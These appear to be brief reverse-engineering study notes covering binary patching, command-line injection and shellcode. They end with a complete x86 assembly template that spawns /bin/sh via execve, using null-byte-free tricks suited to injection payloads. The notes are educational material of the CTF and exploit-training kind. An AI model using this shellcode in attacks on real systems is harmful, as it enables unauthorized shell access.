# Common Techniques
These are many common techniques used in different reverse engineering problems.
## Binary Patching
## Command Line Injection
  - changing system file paths
## Shellcode
  - execve(sh, argv, envp): executes the shell
    - sh: is the file
    - argv: multiple argument vector
    - envp: environment variable vector
  - vector in C is ended with NULL to tell how many items are in the vector
  -  don't `use mov eax, 0` don't want a null byte in the payload
  -  al is the lowest byte of eax
  -  envp will be the second element of argv
  -  useful template for shellcode
``` 
#include <sys/syscall.h> 
#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+4)

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    esi                    /* esi points to STRING */
  mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
  xor    eax,eax                /* get a 32-bit zero value */
  mov    [STRLEN + esi],al      /* null-terminate our string */
  mov    [ENVP + esi], eax      /* set up null envp */

  mov    al,SYS_execve          /* syscall number */
  mov    ebx,esi                /* arg 1: string pathname */
  lea    ecx,[ARGV + esi]       /* arg 2: argv */
  lea    edx,[ENVP + esi]       /* arg 3: envp */
  int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */

  xor    ebx,ebx                /* arg 1: 0 */
  mov    eax,ebx
  inc    eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int    0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING ```